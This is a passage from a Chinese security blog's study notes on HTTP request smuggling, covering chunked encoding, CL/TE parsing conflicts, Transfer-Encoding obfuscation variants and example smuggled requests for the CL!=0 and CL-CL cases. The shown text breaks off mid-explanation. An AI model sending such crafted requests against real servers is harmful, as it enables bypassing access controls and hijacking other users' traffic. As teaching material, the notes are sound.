<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="HTTP请求走私攻击-学习笔记"><meta name="keywords" content="XSS,协议层,HTTPsmuggle"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>HTTP请求走私攻击-学习笔记 | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TL-DR"><span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-LifeLine"><span class="toc-text">0x01 LifeLine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">0x02 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-text">2.1 预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84HTTP%E5%8D%8F%E8%AE%AE%E5%AD%98%E5%9C%A8%E4%B8%80%E5%AE%9A%E5%8C%BA%E5%88%AB"><span class="toc-text">2.1.1 不同版本的HTTP协议存在一定区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-Transfer-Encoding"><span class="toc-text">2.1.2 Transfer-Encoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-CL-amp-TE-%E8%A7%A3%E6%9E%90%E4%BC%98%E5%85%88%E7%BA%A7%E9%A1%BA%E5%BA%8F"><span class="toc-text">2.1.3  CL &amp; TE 解析优先级顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-Bad-Chunked-Transmission"><span class="toc-text">2.1.4 Bad Chunked Transmission</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-5-%E8%83%8C%E6%99%AF"><span class="toc-text">2.1.5 背景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%8E%9F%E7%90%86"><span class="toc-text">2.2 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-CL-0"><span class="toc-text">2.3 CL!&#x3D;0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-CL-CL"><span class="toc-text">2.4 CL-CL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-CL-TE"><span class="toc-text">2.5 CL-TE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-TE-CL"><span class="toc-text">2.6 TE-CL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-TE-TE"><span class="toc-text">2.7 TE-TE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-amp-%E5%8D%B1%E5%AE%B3"><span class="toc-text">0x03 攻击方式&amp;危害</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-bypass-front-end-security-controls-portswigger"><span class="toc-text">3.1 bypass front-end security controls-portswigger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Revealing-Front-end-Request-Rewriting-portswigger"><span class="toc-text">3.2 Revealing Front-end Request Rewriting-portswigger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Capturing-other-users%E2%80%99-requests"><span class="toc-text">3.3 Capturing other users’ requests</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Exploit-Reflected-XSS"><span class="toc-text">3.4 Exploit Reflected XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><span class="toc-text">3.5 Turn An On-Site Redirect Into An Open Redirect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-Perform-Web-Cache-Poisoning"><span class="toc-text">3.6 Perform Web Cache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-Perform-Web-Cache-Deception"><span class="toc-text">3.7 Perform Web Cache Deception</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B"><span class="toc-text">0x04 实际案例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-ATS"><span class="toc-text">4.1 ATS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Paypal"><span class="toc-text">4.2 Paypal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-%E5%AF%B9js%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%8A%95%E6%AF%92"><span class="toc-text">4.2.1 对js文件进行投毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2-%E7%BB%95%E8%BF%87CSP%E7%AD%96%E7%95%A5"><span class="toc-text">4.2.2 绕过CSP策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-3-%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">4.2.3 修复与绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-nginx%E4%B8%A4%E4%B8%AA%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x05 nginx两个请求走私漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%EF%BC%88CVE-2019-20372%EF%BC%89Nginx-error-page-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">5.1 （CVE-2019-20372）Nginx error_page 请求走私漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx-lt-1-8-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-text">5.2 （CVE-2020-12440）Nginx &lt;&#x3D; 1.8.0 请求走私</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Tools-amp-Check"><span class="toc-text">0x06 Tools&amp;Check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="toc-text">0x07 防御策略</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xFF-reference"><span class="toc-text">0xFF reference</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">53</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">35</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://is4b3lla3.github.io">lsabellae</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">HTTP请求走私攻击-学习笔记</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-20</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">10.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 44 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p><img src="http://image.v0w.top/2020/12/httpsmuggling.jpeg" alt="HTTP-Smuggling"></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前有听说过这种攻击方式，但是没有详细了解该攻击方式。直到最近遇到的一个漏洞<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2020-12440">CVE-2020-12440</a>，使我不得不面对这样一个话题，而在这个过程中，发现之前错过这个攻击方式还是非常有意思的，于是记录一下我的学习过程，并尝试对<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2020-12440">CVE-2020-12440</a>这个存在于<code>nginx&lt;=1.8.0</code>的漏洞，进行复现。</p>
<p>本文参考了大量其他师傅的文章，会在具体用到的地方和reference中给出链接，这些师傅的总结都很值得一读，强烈推荐。<br>本文在总结师傅们的文章和经验的同时，会补充CVE-2020-12440的复现分析，补充在平时测试过程中，我们如何利用工具提高该漏洞的检测效率。</p>
<h1 id="0x01-LifeLine"><a href="#0x01-LifeLine" class="headerlink" title="0x01 LifeLine"></a>0x01 LifeLine</h1><blockquote>
<p>最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p>
</blockquote>
<blockquote>
<p>在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></p>
</blockquote>
<blockquote>
<p>在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153">https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153</a></p>
</blockquote>
<h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><h2 id="2-1-预备知识"><a href="#2-1-预备知识" class="headerlink" title="2.1 预备知识"></a>2.1 预备知识</h2><h3 id="2-1-1-不同版本的HTTP协议存在一定区别"><a href="#2-1-1-不同版本的HTTP协议存在一定区别" class="headerlink" title="2.1.1 不同版本的HTTP协议存在一定区别"></a>2.1.1 不同版本的HTTP协议存在一定区别</h3><table>
<thead>
<tr>
<th></th>
<th>显著特点</th>
<th>支持的请求方法</th>
<th>性能优化</th>
<th>泛用程度</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP0.9</td>
<td>不支持请求头响应头，纯文本</td>
<td>GET</td>
<td></td>
<td>已过时</td>
</tr>
<tr>
<td>HTTP1.0</td>
<td>支持请求头响应头，超文本</td>
<td>GET、HEAD、POST</td>
<td>短链接，无优化</td>
<td>仍有少量使用</td>
</tr>
<tr>
<td>HTTP1.1</td>
<td>性能优化，增加请求方法</td>
<td>增加了OPTIONS,PUT, DELETE, TRACE, CONNECT方法</td>
<td>增加Keep-Alive和chunked分块传输，请求流水线等</td>
<td>目前使用最广泛</td>
</tr>
<tr>
<td>HTTP2.0</td>
<td>增加了二进制分帧</td>
<td>无变化</td>
<td>增加了二进制分帧层用与多路复用，通信在一个链接上进行，ServerPush</td>
<td>目前应用较少</td>
</tr>
</tbody></table>
<p>关于不同版本的HTTP协议的区别联系，可以阅读这篇知乎文章：<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37387316">HTTP协议几个版本的比较</a></p>
<p>更为完整的信息可能需要参考RFC文档中对于http协议的规定，这里给出RFC文档的地址：<br><a target="_blank" rel="noopener" href="https://tools.ietf.org/rfc/">RFC文档</a><br>其中关于http1.1的规定如下：<em>RFC2068，2616，2817，7230-7235</em></p>
<p>我们不难发现，目前应用最广的HTTP1.1增加了Keep-alive特性，</p>
<blockquote>
<p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p>
</blockquote>
<blockquote>
<p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p>
</blockquote>
<blockquote>
<p>现如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p>
</blockquote>
<h3 id="2-1-2-Transfer-Encoding"><a href="#2-1-2-Transfer-Encoding" class="headerlink" title="2.1.2 Transfer-Encoding"></a>2.1.2 Transfer-Encoding</h3><blockquote>
<p> Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP’s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</p>
</blockquote>
<p>Transfer-Encoding 是一种被设计用来支持 7-bit 传输服务安全传输二进制数据的字段，有点类似于 MIME (Multipurpose Internet Mail Extensions) Header 中的 Content-Transfer-Encoding 。在HTTP的情况下，Transfer-Encoding 的主要用来以指定的编码形式编码 payload body 安全地传输给用户。在 HTTP/1.1 中引入，在 HTTP/2 中取消。</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding">MDN</a> 列举了几种属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunked | compress | deflate | gzip | identity</span><br></pre></td></tr></table></figure>

<p>我们这里主要关注 chunked 这一种传输编码方式，它在网络攻击中也不是第一次提及了，之前就有师傅利用这个字段去绕过一些 WAF，可以参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/194351.html">利用分块传输吊打所有WAF</a>，也是比较有意思的 bypass 技巧。</p>
<p>我们可以在<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7230#section-4.1">RFC7230</a>中查看到有关分块传输的定义规范。</p>
<p>chunk传输数据格式如下，其中size的值由16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>举个例子就可以简单理解chunked模式下的分块传输了：<br>假设我们想通过POST传输这样的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;V0WKeeper</span><br></pre></td></tr></table></figure>
<p>正常请求是这样的：<br><img src="http://image.v0w.top/2020/12/16082671004753.jpg" alt="正常请求"><br>通过增加<code>Transfer-Encoding: chunked</code>的headers，我们可以这样传输：<br><img src="http://image.v0w.top/2020/12/16082677743329.jpg" alt="chunked"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">2\r\n</span><br><span class="line">na\r\n</span><br><span class="line">c\r\n</span><br><span class="line">me&#x3D;V0WKeeper\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个分块：<code>\r\n</code>是CRLF，所以这里的<code>\r\n</code>是两个字节；第一个数字 2 表示<code>chunked-size</code>,是指接下来会有 2 个字节的数据(这个数字是16进制的)，也就是 <code>na</code> 这 2 个字母，然后按照 RFC 文档标准，字母 <code>na</code> 部分后面需要跟\r\n表示这个na是<code>chunk-data</code>部分</li>
<li>第二个分块：16进制的数字 c 后面表示<code>chunk-size</code>部分，是十六进制数表示这个分块的<code>chunk-data</code>是12字节，即<code>me=V0WKeeper</code>，之后<code>\r\n</code>表明这是<code>chunk-data</code>部分</li>
<li>最后有一个<code>0\r\n\r\n</code>表示分块传输结束。</li>
</ul>
<h3 id="2-1-3-CL-amp-TE-解析优先级顺序"><a href="#2-1-3-CL-amp-TE-解析优先级顺序" class="headerlink" title="2.1.3  CL &amp; TE 解析优先级顺序"></a>2.1.3  CL &amp; TE 解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。那么现在有一个问题：对于 CL &amp; TE 解析是否存在优先级顺序？<br>这个在RFC中是有规定的，见 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC 7230 Message Body Length</a></p>
<blockquote>
<p> If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p>
</blockquote>
<p>虽然这里是指出了 TE 优先于 CL ，但是我们仍然可以通过一些方式绕过，又或者说，那个中间件的也没有依照这个 RFC 标准规范实现，这就导致了差异性的存在。</p>
<h3 id="2-1-4-Bad-Chunked-Transmission"><a href="#2-1-4-Bad-Chunked-Transmission" class="headerlink" title="2.1.4 Bad Chunked Transmission"></a>2.1.4 Bad Chunked Transmission</h3><p>根据 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a> ：</p>
<blockquote>
<p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p>
</blockquote>
<p>也就是说当接受到<code>Transfer-Encoding: chunked, zorg</code>的时候，应该返回 400 错误。</p>
<p>这类可以有很多绕过，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line"> : chunked</span><br></pre></td></tr></table></figure>

<h3 id="2-1-5-背景"><a href="#2-1-5-背景" class="headerlink" title="2.1.5 背景"></a>2.1.5 背景</h3><p>简单的网络环境中，我们直接通过浏览器访问服务器，但是由于很多静态资源需要在服务器提供，这种方式无疑是大大增加了web服务器的负荷。</p>
<p>而在稍微复杂的网络环境中，为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。另一方面，这个反向代理可以隐藏web服务器的真实IP，所以很多中小型网站都采用类似方案。</p>
<p>常见拓扑图如下：<br><img src="http://image.v0w.top/2020/12/16082085119296.jpg" alt="拓扑"></p>
<blockquote>
<p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p>
</blockquote>
<blockquote>
<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
</blockquote>
<h2 id="2-2-原理"><a href="#2-2-原理" class="headerlink" title="2.2 原理"></a>2.2 原理</h2><p>而这个HTTP请求走私漏洞的产生正是由于：<strong>前端的反向代理服务器和后端的Web服务器，对同一个请求的理解不一致。</strong></p>
<p>可能是不同的服务器对RFC标准实现的方式不同，程度不同，配置不同等等。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。</p>
<p><img src="http://image.v0w.top/2020/12/16082608974438.jpg" alt="原理"><br>如上图，一段时间内有很多用户访问这个网站，其中一个攻击者，恶意构造一个请求，这个请求在前端服务器的理解是两个请求，而后端服务器理解是一个请求和一个不完整的请求，于是会继续等待，等待到正常用户的访问，将其拼接起来，然后认为这个拼接的请求是一个完整的请求，之后对其响应。</p>
<p>直接说原理可能太抽象了，我们通过几个例子，刚好了解这种攻击方式的多种情形，也可以具体感受一下HTTP请求走私攻击原理。</p>
<p>根据破坏请求的方式不同，一般将HTTP走私分为几种不同的情形（CL:Content-Length, TE:Transfer-Encoding）：</p>
<ul>
<li>CL!=0</li>
<li>CL-CL</li>
<li>CL-TE</li>
<li>TE-CL</li>
<li>TE-TE</li>
</ul>
<h2 id="2-3-CL-0"><a href="#2-3-CL-0" class="headerlink" title="2.3 CL!=0"></a>2.3 CL!=0</h2><p>其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p>
<p>在<code>RFC2616</code>中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的<code>RFC7231</code>的4.3.1节中也仅仅提了一句。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7231#section-4.3.1">https://tools.ietf.org/html/rfc7231#section-4.3.1</a></p>
<p>sending a payload body on a GET request might cause some existing implementations to reject the request</p>
</blockquote>
<p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p>
<p>比如我们构造请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求，分别是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>
<p>这就导致了请求走私。</p>
<h2 id="2-4-CL-CL"><a href="#2-4-CL-CL" class="headerlink" title="2.4 CL-CL"></a>2.4 CL-CL</h2><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p>
</blockquote>
<p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。</p>
<p>此时恶意攻击者可以构造一个特殊的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>
<p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。<br>这时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是</p>
